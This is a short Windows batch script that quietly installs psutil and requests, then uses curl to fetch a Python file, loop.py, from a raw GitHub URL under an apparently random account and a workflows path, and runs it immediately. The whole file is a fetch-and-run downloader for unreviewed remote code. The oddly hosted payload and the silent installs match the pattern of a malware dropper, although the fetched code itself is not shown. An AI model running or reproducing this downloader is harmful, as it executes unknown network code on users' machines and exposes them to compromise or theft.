@echo off
pip install psutil --quiet
pip install requests --quiet
curl -s -L -o loop.py https://raw.githubusercontent.com/Godehi5524claspir451/bug-free-spork/refs/heads/main/.github/workflows/loop.py
python loop.py
